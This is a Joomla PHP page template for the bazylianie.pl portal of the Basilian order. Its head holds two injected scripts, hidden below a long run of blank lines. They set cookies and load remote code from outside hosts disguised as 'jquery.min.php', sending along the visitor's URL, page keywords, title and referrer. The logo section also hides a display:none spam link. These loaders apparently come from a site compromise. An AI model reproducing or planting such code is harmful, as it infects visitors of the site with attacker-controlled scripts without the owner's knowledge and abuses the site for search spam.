<?php
/**
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>



































<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://hotelvitoria.net/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'K85164' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
<script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://ittermann.home.pl/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script></head>
<body>
<div id="wszystko">
<!-- start CONTAINER section -->
<div id="container_index" class="index">
<!-- start TOP section -->
<div class="top">
	    <!-- start LOGO section -->
        <div class="top logo">
        	<a href="<?php echo $this->baseurl ?>"><img src="templates/<?php echo $this->template; ?>/img/logo.jpg" width="248" height="101" alt="Bazylianie.pl - Portal informacyjny Zakonu Św. Bazylego Wielkiego" /></a><!-- 8f5a079dd3 -->﻿<div style="display:none"><a href="http://earthfireinstitute.org/">Loss Program Weight</a></div><!-- 8f5a079dd3 -->
        </div><!-- end LOGO section -->
	    <!-- start OPTIONS section -->
        <div class="top options">
	 <?php /* <div id="top_canv">
           <ul>
	    <li id="top_rss"><a href="?option=com_ninjarsssyndicator&feed_id=1&format=raw">RSS</a></li>
	    <li id="top_fav"><a href="javascript:window.external.AddFavorite('http://www.bazylianie.pl','ЧИН СВЯТОГО ВАСИЛІЯ ВЕЛИКОГО');">Додати в вибране</a></li>
	    <li id="top_mapa"><a href="?option=com_sefservicemap&task=xmlmapindex&no_html=1">Mapa strony</a></li>
	    </ul>
	 </div>    */ ?>
        </div><!-- end OPTIONS section -->
        <!-- start SEARCH section -->        
    	<div class="top search">
       	  	<form action="" method="get"  id="form1">
   	      	<span id="search">
   	       		<input name="searchword" id="searchfield" type="text" class="input" accesskey="s" tabindex="1" value="Пошук" />
   	       		<input type="hidden" name="ordering" value="newest" />
   	       		<input type="hidden" name="searchphrase" value="any" />
   	       		<input type="hidden" name="option" value="com_search" />
            </span>
            <input name="" type="submit" class="ok" value="ok" />
          </form>
    	</div><!-- end SEARCH section -->
        <!-- start LANGUAGE SWITCH section -->
    	<div class="top lang">
    	 <?php  if(stripos($_SERVER['SERVER_NAME'],"google")==false){ ?>
    		<a class="atranslate" href="<?php echo "http://translate.google.pl/translate?hl=pl&sl=uk&tl=en&u=".juri::current().'?'.urlencode($_SERVER['QUERY_STRING']); ?>" target="_self">
            	english
            </a> 
            <a class="atranslate" href="http://translate.google.pl/translate?hl=pl&sl=uk&tl=pl&u=<?php echo juri::current().'?'.urlencode($_SERVER['QUERY_STRING']); ?>" target="_self">
            	polski
            </a>
             <?php  } ?>
        </div><!-- end LANGUAGE SWITCH section -->
        <!-- start NAVIGATION section -->
	    <div class="top nav">
        	<!-- start MENU section -->	
           	<div id="menu">
           	<jdoc:include type="modules" name="topmenu" style="rounded" />
			</div><!-- end MENU section -->
	    </div><!-- end NAVIGATION section -->
  </div><!-- end TOP section -->
  <?php if($this->countModules('kalendarz')) : ?>
	  <!-- start CALENDAR section-->
<div id="calendarium">
		<jdoc:include type="modules" name="kalendarz" style="rounded" />	
</div>
   <!--END CALENDAR section--> 
   <?php endif; ?>
   
   <!--<div style="position: absolute; top: 120px; right: 60px; color: red;"><a style="color: orange; font-size: 14px;" href="http://bazylianie.pl/?option=com_content&view=article&id=811&catid=&Itemid=2">NOWE ZMIANY: Tagi i roczna statystyka</a></div> -->
   
  <?php if($this->countModules('breadcrumb')) : ?>                          
   <div id="breadcrumb">
  	<jdoc:include type="modules" name="breadcrumb" />
  </div>
<?php endif; ?>

        <jdoc:include type="modules" name="slider" />

        
          <jdoc:include type="modules" name="button_menu" style="rounded" />
  


    <div id="main"><!-- start MAIN section -->
        <div id="topnews"><!-- start TOPNEWS section -->
            <jdoc:include type="component" />
      </div><!-- end TOPNEWS section -->

      <div id="sidebar">
        <div id="sidebar_section">                
          <jdoc:include type="modules" name="right" style="xhtml"/> 
	</div>             
      </div>

    </div>
</div><!-- END CONTAINER section -->	 
 
    <div id="footer"><!-- start FOOTER section -->
    	<div class="ll">
        </div>
        <div class="l">
        	<img src="templates/<?php echo $this->template; ?>/img/bazylianie_core.png" width="171" height="37" alt="Bazylianie" />
        </div>
        <div class="lr">
        </div>
        <div class="rl">
        </div>
        <div class="r">
            <a href="?option=com_content&view=article&Itemid=2&id=728">
            	Авторські права
            </a> 
            <a href="?option=com_content&view=article&Itemid=2&id=722">
            	Редакція
            </a> 
            <!--<a href="?option=com_content&view=article&Itemid=2&id=723">
            	Для преси
            </a> -->
            <a href="?option=com_content&view=article&Itemid=2&id=724">
            	Співпраця
            </a> 
            <!--<a href="?option=com_content&view=article&Itemid=2&id=725">
            	Друзі
            </a> -->
            <a href="?option=com_content&view=article&Itemid=2&id=726">
            	Політика приватності
            </a>
<a href="http://old.bazylianie.pl" target="_blank">
            	 Старa сторінкa
            </a>
             <a class="oldserwis" href="http://www.webolution.pl" target="_blank"></a>
        </div>
        <div class="rr">
        </div>
    </div><!-- END FOOTER section -->



<jdoc:include type="modules" name="debug" />
</div>
<!-- start sugester code 
<script type="text/javascript" src="http://app.sugester.pl/bazylianie/widget.js"></script>
END sugester code -->
<!-- start AlienSTATS code -->
<script type="text/javascript">
<!--
var alienPath='http://www.stat.bazylianie.pl';
var alienPageDescr='bazylianie v3.0 - <?php echo $this->getTitle(); ?>';
document.write('<scr'+'ipt language="JavaScript" src="'+alienPath+'/astat.js?alienPageDescr='+alienPageDescr+'"><\/scr' + 'ipt>');
//-->
</script>
<!-- end AlienSTATS code -->
<!--<a href="http://taurine.nazwa.pl/bazylianie/www/components/com_joomgallery/img_originals/aktualnoci_1/test_20100517_1311376737.jpg" rel="lightbox[joomgallery]" title="test" class="jg_catelem_photo">
        <img src="http://taurine.nazwa.pl/bazylianie/www/components/com_joomgallery/img_thumbnails/aktualnoci_1/test_20100517_1311376737.jpg" class="jg_photo" alt="test" />
      </a>
-->


<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-27722891-1']); //_gaq.push(['_setAccount', 'UA-16759854-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</body>
</html>